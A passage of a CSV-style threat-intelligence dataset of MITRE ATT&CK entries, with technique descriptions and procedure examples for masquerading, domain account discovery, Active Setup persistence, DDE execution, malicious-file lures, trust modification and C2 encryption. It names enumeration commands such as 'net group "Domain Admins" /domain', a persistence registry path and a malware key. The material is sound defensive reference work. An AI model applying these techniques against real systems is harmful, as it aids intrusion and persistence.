<code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.  Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.","['During the [2016 Ukraine Electric Power Attack] [Sandworm Team] masqueraded executables as `.txt` files.', 'During [Operation Dream Job] [Lazarus Group] disguised malicious template files as JPEG files to avoid detection.', '[Volt Typhoon] has appended copies of the ntds.dit database with a .gif file extension.', 'The [QakBot] payload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon.', '[ANDROMEDA] has been delivered through a LNK file disguised as a folder.', '[Brute Ratel C4] has used Microsoft Word icons to hide malicious LNK files.', '[AvosLocker] has been disguised as a .jpg file.', ""[OSX_OCEANLOTUS.D] has disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents.""]",False
T1587.001,Malware,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.  As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.  Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services]","['[Kimsuky] has developed its own unique malware such as MailFetch.py for use in operations.', '[FIN13] has utilized custom malware to maintain persistence in a compromised environment.', '[Indrik Spider] has developed malware for their operations, including ransomware such as [BitPaymer] and [WastedLocker]', 'During [Operation Wocao] threat actors developed their own custom webshells to upload to compromised servers.', '[Lazarus Group] has developed custom malware for use in their operations.', '[LuminousMoth] has used unique malware for information theft and exfiltration.', '[Sandworm Team] has developed malware for its operations, including malicious mobile applications and destructive malware such as [NotPetya] and [Olympic Destroyer]', '[APT29] has used unique malware in many of their operations.', '[Aoqin Dragon] has used custom malware, including [Mongall] and [Heyoka Backdoor] in their operations.', 'For the [SolarWinds Compromise] [APT29] used numerous pieces of malware that were likely developed for or by the group, including [SUNBURST] [SUNSPOT] [Raindrop] and [TEARDROP] ', '[Cleaver] has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.', 'For [Operation Ghost] [APT29] used new strains of malware including [FatDuke] [MiniDuke] [RegDuke] and [PolyglotDuke]', ""[Moses Staff] has built malware, such as [DCSrv] and [PyDCrypt] for targeting victims' machines."", 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software.', 'For [C0010] UNC3890 actors used unique malware, including [SUGARUSH] and [SUGARDUMP]', '[Turla] has developed its own unique malware for use in operations.', 'For [CostaRicto] the threat actors used custom malware, including [PS1] [CostaBricks] and [SombRAT]', 'For [Operation Sharpshooter] the threat actors used the [Rising Sun] modular backdoor.', '[Ke3chang] has developed custom malware that allowed them to maintain persistence on victim networks.', 'For [Operation Dream Job] [Lazarus Group] developed custom tools such as Sumarta, DBLL Dropper, [Torisma] and [DRATzarus] for their operations.', '[TeamTNT] has developed custom malware such as [Hildegard]', '[FIN7] has developed malware for use in operations, including the creation of infected removable media.', ""[UNC2452] developed [SUNSPOT] [SUNBURST] [TEARDROP] and [Raindrop] [SUNSPOT] and [SUNBURST] were tailored to be incorporated into SolarWind's Orion software library."", '[Night Dragon] used privately developed and customized remote access tools.']",
T1087.002,Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.  Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net] utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell] cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.  ","['During the [SolarWinds Compromise] [APT29] used PowerShell to discover domain accounts by exectuing `Get-ADUser` and `Get-ADGroupMember`.', '[SoreFang] can enumerate domain accounts via <code>net.exe user /domain</code>.', '[Net] commands used with the <code>/domain</code> flag can be used to gather information about and manipulate user accounts on the current domain.', '[FIN13] can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: `GetUserSPNs.vbs` and `querySpn.vbs`.', '[Bazar] has the ability to identify domain administrator accounts.', ""[FIN6] has used Metasploit’s [PsExec] NTDSGRAB module to obtain a copy of the victim's Active Directory database."", '[CrackMapExec] can enumerate the domain user accounts on a targeted system.', '[APT41] used built-in <code>net</code> commands to enumerate domain administrator users.', '[Ke3chang] performs account discovery using commands such as <code>net localgroup administrators</code> and <code>net group ""REDACTED"" /domain</code> on specific permissions groups.', '[Scattered Spider] leverages legitimate domain accounts to gain access to the target environment.', '[Sykipot] may use <code>net group ""domain admins"" /domain</code> to display accounts in the ""domain admins"" permissions group and <code>net localgroup ""administrators""</code> to list local system administrator group membership.', '[BoomBox] has the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users.', '[MuddyWater] has used <code>cmd.exe net user /domain</code> to enumerate domain users.', '[dsquery] can be used to gather information on user accounts within a domain.', '[BlackCat] can utilize `net use` commands to identify domain users.', '[BloodHound] can collect information about domain users, including identification of domain admin accounts.', ""[LAPSUS$] has used the AD Explorer tool to enumerate users on a victim's network."", '[Chimera] has has used <code>net user /dom</code> and <code>net user Administrator</code> to enumerate domain accounts including administrator accounts.', '[Empire] can acquire local and domain user account information.', '[menuPass] has used the Microsoft administration tool csvde.exe to export Active Directory data.', '[OilRig] has run <code>net user</code>, <code>net user /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to get account listings on a victim.', '[PoshC2] can enumerate local and domain user account information.', '[POWRUNER] may collect user account information by running <code>net user /domain</code> or a series of other commands on a victim.', '[ToddyCat] has run `net user %USER% /dom` for account discovery. ', '[Turla] has used <code>net user /domain</code> to enumerate domain accounts.', 'During [Operation CuckooBees] the threat actors used the `dsquery` and `dsget` commands to get domain environment information and to query users in administrative groups.', '[SILENTTRINITY] can use `System.Security.AccessControl` namespaces to retrieve domain user information.  ', '[Wizard Spider] has identified domain admins through the use of `net group ""Domain admins"" /DOMAIN`. [Wizard Spider] has also leveraged the PowerShell cmdlet `Get-ADComputer` to collect account names from Active Directory data.', '[Fox Kitten] has used the Softerra LDAP browser to browse documentation on service accounts.', '[Stuxnet] enumerates user accounts of the domain.', 'During [Operation Wocao] threat actors used the `net` command to retrieve information about domain accounts. ', ""During [Operation Dream Job] [Lazarus Group] queried compromised victim's active directory servers to obtain the list of employees including administrator accounts."", '[Cobalt Strike] can determine if the user on an infected machine is in the admin or domain admin group.', '[IcedID] can query LDAP to identify additional users on the network to infect.', '[Brute Ratel C4] can use LDAP queries, `net group ""Domain Admins"" /domain` and `net user /domain` for discovery.', '[Poseidon Group] searches for administrator accounts on both the local victim machine and the network.', '[OSInfo] enumerates local and domain users', '[Bankshot] gathers domain and account names/information through process monitoring.', '[Valak] has the ability to enumerate domain admin accounts.', 'The [IceApple] Active Directory Querier module  can perform authenticated requests against an Active Directory server.', '[Volt Typhoon] has run `net group /dom` and `net group ""Domain Admins"" /dom` in compromised environments for account discovery.', '[Sandworm Team] has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.\t', '[BRONZE BUTLER] has used <code>net user /domain</code> to identify account information.', '[Dragonfly] has used batch scripts to enumerate users on a victim domain controller.', '[AdFind] can enumerate domain users.', '[Lazarus Group] has queried an active directory server to obtain the list of accounts, including administrator accounts.', '[APT29] has used PowerShell to discover domain accounts by executing <code>Get-ADUser</code> and <code>Get-ADGroupMember</code>.', '[Operation Wocao] has used the <code>net</code> command to retrieve information about domain accounts.\t ', '[Dragonfly 2.0] used batch scripts to enumerate users on a victim domain controller.', '[Cobalt Strike] can determine if the user on an infected machine is in the admin or domain admin group.']",False
T1547.014,Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.  Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.  Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading] to make the Registry entries look as if they are associated with legitimate programs.",['[PoisonIvy] creates a Registry key in the Active Setup pointing to a malicious executable.'],False
T1559.002,Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.  Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model] DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.  Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing] campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter] DDE execution can be invoked remotely via [Remote Services] such as [Distributed Component Object Model] (DCOM).","['[Ramsay] has been delivered using OLE objects in malicious documents.\t', 'During [Operation Sharpshooter] threat actors sent malicious Word OLE documents to victims.', '[HAWKBALL] has used an OLE object that uses Equation Editor to drop the embedded shellcode.', '[Cobalt Group] has sent malicious Word OLE compound documents to victims.', '[FIN7] spear phishing campaigns have included malicious Word documents with DDE execution.', '[MuddyWater] has used malware that can execute PowerShell scripts via DDE.', '[Sidewinder] has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.', '[RTM] can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.', '[APT28] has delivered [JHUHUGIT] and [Koadic] by executing PowerShell commands through DDE in Word documents.', '[Valak] can execute tasks via OLE.', '[PoetRAT] was delivered with documents using DDE to execute malicious code.', '[APT37] has used Windows DDE for execution of commands and a malicious VBS.', '[POWERSTATS] can use DDE to execute additional payloads on compromised hosts.', '[Gallmaker] attempted to exploit Microsoft’s DDE protocol in order to gain access to victim machines and for execution.', '[Leviathan] has utilized OLE as a method to insert malicious content inside various phishing documents. ', '[BITTER] has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads. ', '[KeyBoy] uses the Dynamic Data Exchange (DDE) protocol to download remote payloads.', '[GravityRAT] has been delivered via Word documents using DDE for execution.', '[TA505] has leveraged malicious Word documents that abused DDE.', '[Patchwork] leveraged the DDE protocol to deliver their malware.', '[Sharpshooter] has sent malicious Word OLE documents to victims.']",False
T1204.002,Malicious File,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment] Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.  Adversaries may employ various forms of [Masquerading] and [Obfuscated Files or Information] to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.   While [Malicious File] frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing]","['[Malteiro] has relied on users to execute .zip file attachments containing malicious URLs. ', '[KOCTOPUS] has relied on victims clicking a malicious document for execution. ', '[KONNI] has relied on a victim to enable malicious macros within an attachment delivered via email.', '[APT12] has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.', '[Pony] has attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format).', '[Kimsuky] has used attempted to lure victims into opening malicious e-mail attachments.', '[Machete] has relied on users opening malicious attachments delivered through spearphishing to execute malware.', '[Chaes] requires the user to click on the malicious Word document to execute the next part of the attack. ', '[SVCReady] has relied on users clicking a malicious attachment delivered through spearphishing.', '[Elderwood] has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.', '[Transparent Tribe] has used weaponized documents in e-mail to compromise targeted systems.', '[Dragonfly] has used various forms of spearphishing in attempts to get users to open malicious attachments.', '[WIRTE] has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.', '[WarzoneRAT] has relied on a victim to open a malicious attachment within an email for execution.', '[NativeZone] can display an RTF document to the user  to enable execution of  [Cobalt Strike] stage shellcode.', '[RTM] has attempted to lure victims into opening e-mail attachments to execute malicious code.', '[Aoqin Dragon] has lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads.', '[Agent Tesla] has been executed through malicious e-mail attachments ', '[Hancitor] has used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros.', '[PoetRAT] has used spearphishing attachments to infect victims.', '[APT-C-36] has prompted victims to accept macros in order to execute the subsequent payload.', '[Emotet] has relied upon users clicking on a malicious attachment delivered through spearphishing.', '[Metamorfo] requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer. ', '[Mongall] has relied on a user opening a malicious document for execution.', '[CURIUM] has lured users into opening malicious files delivered via social media.', '[Gallmaker] sent victims a lure document with a warning that asked victims to “enable content” for execution.', '[Tropic Trooper] has lured victims into executing malware via malicious e-mail attachments.', '[Dark Caracal] makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.', '[EnvyScout] has been executed through malicious files attached to e-mails.', '[DarkHydrus] has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.', '[PLATINUM] has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.', 'During [Operation Dust Storm] the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.', '[menuPass] has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.', '[TA551] has prompted users to enable macros within spearphishing attachments to install malware.', ""[HEXANE] has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware."", '[Astaroth] has used malicious files including VBS, LNK, and HTML for execution.', '[NETWIRE] has been executed through luring victims into opening malicious documents.', '[FIN8] has used malicious e-mail attachments to lure victims into executing malware.', '[Threat Group-3390] has lured victims into opening malicious files containing malware.', '[ThreatNeedle] relies on a victim to click on a malicious document for initial execution.', '[Clambling] has gained execution through luring victims into opening malicious files.', '[QakBot] has gained execution through users opening malicious attachments.', 'During [Frankenstein] the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.', '[BITTER] has attempted to lure victims into opening malicious attachments delivered via spearphishing.', '[Ferocious Kitten] has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.', '[APT37] has sent spearphishing attachments attempting to get a user to open them.', 'During [Operation Spalax] the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware. ', '[Ninja] has gained execution through victims opening malicious executable files embedded in zip archives.', '[LazyScripter] has lured users to open malicious email attachments.', '[PROMETHIUM] has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.', '[TA505] has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, [TA505] makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. ', 'During [C0015] the threat actors relied on users to enable macros within a malicious Microsoft Word document.', '[BoomBox] has gained execution through user interaction with a malicious file.', '[APT39] has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.', '[Mispadu] has relied on users to execute malicious files in order to gain execution on victim machines.', '[KOPILUWAK] has gained execution through malicious attachments.', '[Higaisa] used malicious e-mail attachments to lure victims into executing LNK files.', '[Rancor] attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.', '[Valak] has been executed via Microsoft Word documents containing malicious macros.', '[Wizard Spider] has lured victims to execute malware with spearphishing attachments containing macros to download either [Emotet] Bokbot, [TrickBot] or [Bazar]', '[Grandoreiro] has infected victims via malicious attachments.', '[OSX/Shlayer] has relied on users mounting and executing a malicious DMG file.', '[OilRig] has delivered macro-enabled documents that required targets to click the ""enable content"" button to execute the payload on the system.', '[Sandworm Team] has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.', '[Magic Hound] has attempted to lure victims into opening malicious email attachments.', ""[DanBot] has relied on victims' opening a malicious file for initial execution."", '[FIN4] has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).', '[Cobalt Group] has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.', '[SQLRat] relies on users clicking on an embedded image to execute the scripts.', '[Saint Bot] has relied upon users to execute a malicious attachment delivered via spearphishing.', '[REvil] has been executed via malicious MS Word e-mail attachments.', '[CSPY Downloader] has been delivered via malicious documents with embedded macros.', '[KGH_SPY] has been spread through Word documents containing malicious macros.', '[Snip3] can gain execution through the download of visual basic files.', '[StrongPity] has been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.', '[TrickBot] has attempted to get users to launch malicious documents to deliver its payload. ', 'A Word document delivering [TYPEFRAME] prompts the user to enable macro execution.', '[Inception] lured victims into clicking malicious files for machine reconnaissance and to execute malware.', '[EXOTIC LILY] has gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO.', '[Black Basta] has been downloaded and executed from malicious Excel files.', '[Ajax Security Team] has lured victims into executing malicious files.', '[Cardinal RAT] lures victims into executing malicious macros embedded within Microsoft Excel documents.', '[IcedID] has been executed through Word documents with malicious embedded macros.', '[CARROTBALL] has been executed through users being lured into opening malicious e-mail attachments.', '[Flagpro] has relied on users clicking a malicious attachment delivered through spearphishing.', '[ZxxZ] has relied on victims to open a malicious attachment delivered via email.', 'During [C0011] [Transparent Tribe] relied on a student target to open a malicious document delivered via email.', 'During [Operation Dream Job] [Lazarus Group] lured victims into executing malicious documents that contained ""dream job"" descriptions from defense, aerospace, and other sectors.', '[DarkTortilla] has relied on a user to open a malicious document or archived file delivered via email for initial execution.', '[PLEAD] has been executed via malicious e-mail attachments.', '[Lazarus Group] has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.', '[FIN6] has used malicious documents to lure victims into allowing execution of PowerShell scripts.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. ', '[STARWHALE] has relied on victims opening a malicious Excel file for execution.', '[Patchwork] embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.', '[Bisonal] has relied on users to execute malicious file attachments delivered via spearphishing emails. ', '[SYSCON] has been executed by luring victims to open malicious e-mail attachments.', '[Whitefly] has used malicious .exe or .dll files disguised as documents or images.', '[TA459] has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.', '[FIN7] lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.', '[BADFLICK] has relied upon users clicking on a malicious attachment delivered through spearphishing.', '[Bad Rabbit] has been executed through user installation of an executable disguised as a flash installer.', '[Nomadic Octopus] as attempted to lure victims into clicking on malicious attachments within spearphishing emails.', '[DnsSystem] has lured victims into opening macro-enabled Word documents for execution.', '[BLINDINGCAN] has lured victims into executing malicious macros embedded within Microsoft Office documents.', '[Woody RAT] has relied on users opening a malicious email attachment for execution.', '[Bundlore] has attempted to get users to execute a malicious .app file that looks like a Flash Player update.', '[OutSteel] has relied on a user to execute a malicious attachment delivered via spearphishing.', '[APT28] attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.', '[JCry] has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. ', '[Gorgon Group] attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.', '[APT19] attempted to get users to launch malicious attachments delivered via spearphishing emails.', '[TA2541] has used macro-enabled MS Word documents to lure victims into executing malicious payloads. ', '[Squirrelwaffle] has relied on users enabling malicious macros within Microsoft Excel and Word attachments.', '[DarkGate] initial infection payloads can masquerade as pirated media content requiring user interaction for code execution. [DarkGate] is distributed through phishing links to VBS or MSI objects requiring user interaction for execution.', '[Bandook] has used lure documents to convince the user to enable macros. ', '[Earth Lusca] required users to click on a malicious file for the loader to activate.', '[Rifdoor] has been executed from malicious Excel or Word documents containing macros.', '[SideCopy] has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.', '[Mofang] malicious spearphishing attachments required a user to open the file after receiving.', '[Leviathan] has sent spearphishing attachments attempting to get a user to click.', '[Tonto Team] has relied on user interaction to open their malicious RTF documents. ', 'During [Operation Honeybee] threat actors relied on a victim to enable macros within a malicious Word document.', '[APT30] has relied on users to execute malicious file attachments delivered via spearphishing emails.', '[Andariel] has attempted to lure victims into enabling malicious macros within email attachments.', '[BRONZE BUTLER] has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.', '[APT38]  has attempted to lure victims into enabling malicious macros within email attachments.', '[Javali] has achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript.', '[MuddyWater] has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.\t ', '[Bumblebee] has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs. ', '[Naikon] has convinced victims to open malicious attachments to execute malware.', '[AppleSeed] can achieve execution through users running malicious file attachments distributed via email.', '[Ramsay] has been executed through malicious e-mail attachments.', '[ROKRAT] has relied upon users clicking on a malicious attachment delivered through spearphishing.', 'During [Operation Sharpshooter] the threat actors relied on victims executing malicious Microsoft Word or PDF files. ', '[Disco] has been executed through inducing user interaction with malicious .zip and .msi files.', '[Lokibot] has tricked recipients into enabling malicious macros by getting victims to click ""enable content"" in email attachments.', 'Some [SUGARDUMP] variants required a user to enable a macro within a malicious .xls file for execution.', '[Taidoor] has relied upon a victim to click on a malicious email attachment.', '[AppleJeus] has required user execution of a malicious MSI installer.', '[InvisiMole] can deliver trojanized versions of software and documents, relying on user execution.', '[RTM] has relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within.', '[Mustang Panda] has sent malicious files requiring direct victim interaction to execute.', '[Octopus] has relied upon users clicking on a malicious attachment delivered through spearphishing.', '[Molerats] has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.', '[Kerrdown] has gained execution through victims opening malicious files.', '[admin@338] has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.', '[Gamaredon Group] has attempted to get users to click on Office attachments with malicious macros embedded.', '[Dridex] has relied upon users clicking on a malicious attachment delivered through spearphishing.', '[Darkhotel] has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.', '[APT32] has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.', '[The White Company] has used phishing lure documents that trick users into opening them and infecting their computers.', '[IndigoZebra] sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.', '[APT33] has used malicious e-mail attachments to lure victims into executing malware.', '[Silence] attempts to get users to launch malicious attachments delivered via spearphishing emails.', '[Ember Bear] has attempted to lure victims into executing malicious files.', '[Sidewinder] has lured targets to click on malicious files to gain execution in the target environment.', '[Indrik Spider] has attempted to get users to click on a malicious zipped file. ', '[APT29] has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files. ', '[Confucius] has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.', '[Heyoka Backdoor] has been spread through malicious document lures.', '[BlackTech] has used e-mails with malicious documents to lure victims into installing malware.\t ', '[Windshift] has used e-mail attachments to lure victims into executing malicious code.', 'The [GuLoader] executable has been retrieved via embedded macros in malicious Word documents.', '[JSS Loader] has been executed through malicious attachments contained in spearphishing emails.', '[Brute Ratel C4] has gained execution through users opening malicious documents.', '[Sharpshooter] has sent malicious DOC and PDF files to targets so that they can be opened by a user.', '[Frankenstein] has used trojanized Microsoft Word documents sent via email, which prompted the victim to enable macros.', '[Dragonfly 2.0] has used various forms of spearphishing in attempts to get users to open attachments.', '[Magic Hound] has lured victims into executing malicious files.']",False
T1591.003,Identify Business Tempo,"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Supply Chain Compromise] or [Trusted Relationship]",[],
T1592.001,Hardware,"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] (ex: hostnames, server banners, user agent strings) or [Phishing for Information] Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Compromise Hardware Supply Chain] or [Hardware Additions]",[],
T1484.002,Trust Modification,"Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.  Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens] without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.   An adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.","['[Scattered Spider] adds a federated identity provider to the victim’s SSO tenant and activates automatic account linking.', '[AADInternals] can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. [AADInternals] can also modify DesktopSSO information.', 'During the [SolarWinds Compromise] [APT29] changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.', '[UNC2452] changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.', '[APT29] changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.']",False
T1573.001,Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.","['[Dridex] has encrypted traffic with RC4.', '[SMOKEDHAM] has encrypted its C2 traffic with RC4.', '[InvisiMole] uses variations of a simple XOR encryption routine for C&C communications.', '[SysUpdate] has used DES to encrypt all C2 communications.', '[Prikormka] encrypts some C2 traffic with the Blowfish cipher.', '[3PARA RAT] command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS. [3PARA RAT] will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails', '[NETEAGLE] will decrypt resources it downloads with HTTP requests by using RC4 with the key ""ScoutEagle.""', '[Machete] has used AES to exfiltrate documents.', '[Azorult] can encrypt C2 traffic using XOR.', '[Bisonal] variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some [Bisonal] samples encrypt C2 communications with RC4. ', '[Sys10] uses an XOR 0x1 loop to encrypt its C2 domain.', '[Elise] encrypts exfiltrated data with RC4.', '[Winnti for Windows] can XOR encrypt C2 traffic.', '[Pandora] has the ability to encrypt communications with D3DES.', '[BADNEWS] encrypts C2 data with a ROR by 3 and an XOR by 0x23.', '[NDiskMonitor] uses AES to encrypt certain information sent over its C2 channel.', '[Mustang Panda] has encrypted C2 communications with RC4.', '[QUIETCANARY] can RC4 encrypt C2 communications.', '[Sardonic] has the ability to use an RC4 key to encrypt communications to and from actor-controlled C2 servers.', '[Darkhotel] has used AES-256 and 3DES for C2 communications.', '[Attor] has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.', '[Lurid] performs XOR encryption.', '[StrifeWater] can encrypt C2 traffic using XOR with a hard coded key.', '[Chaos] provides a reverse shell connection on 8338/TCP, encrypted via AES.', '[POWERTON] has used AES for encrypting C2 traffic.', '[SUNBURST] encrypted C2 traffic using a single-byte-XOR cipher.', '[More_eggs] has used an RC4-based encryption method for its C2 communications.', '[Hikit] performs XOR encryption.', '[NETWIRE] can use AES encryption for C2 data transferred.', '[Helminth] encrypts data sent to its C2 server over HTTP with RC4.', '[QuasarRAT] uses AES with a hardcoded pre-shared key to encrypt network communication.', '[HotCroissant] has compressed network communications and encrypted them with 